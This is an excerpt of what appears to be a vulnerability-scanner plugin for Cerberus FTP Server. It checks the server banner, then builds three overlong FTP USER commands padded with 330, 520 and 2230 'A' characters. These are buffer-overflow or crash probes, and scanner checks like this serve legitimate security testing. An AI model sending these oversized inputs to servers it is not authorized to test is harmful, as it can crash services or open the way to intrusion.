...
if(!banner || !ContainsString( banner, "Cerberus" )){
	exit( 0 );
}
...
req1 = NASLString( "USER ", crap( data: raw_string( 0x41 ), length: 330 ), "\\r\\n" );
req2 = NASLString( "USER ", crap( data: raw_string( 0x41 ), length: 520 ), "\\r\\n" );
req3 = NASLString( "USER ", crap( data: raw_string( 0x41 ), length: 2230 ), "\\r\\n" );
